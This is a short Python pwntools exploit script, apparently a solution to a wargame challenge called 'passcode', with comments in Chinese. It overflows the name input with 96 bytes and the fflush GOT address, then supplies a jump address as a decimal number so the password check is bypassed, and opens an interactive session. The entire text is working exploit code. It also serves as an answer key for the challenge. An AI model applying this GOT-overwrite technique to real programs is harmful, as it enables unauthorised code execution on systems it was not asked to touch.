from pwn import *

context.binary = elf = ELF('/home/passcode/passcode')
context.arch   = 'i386'

FFLUSH_GOT = elf.got['fflush']
JUMP       = 0x080492a1            

p = process(elf.path)               # or: p = remote('0', 9000)

payload1 = b"A"*96 + p32(FFLUSH_GOT)   # 讓 passcode1 = &GOT[fflush]
p.sendline(payload1)                   # 第一次輸入：name
p.sendline(str(JUMP).encode())         # 第二次輸入：十進位地址給 %d


p.interactive()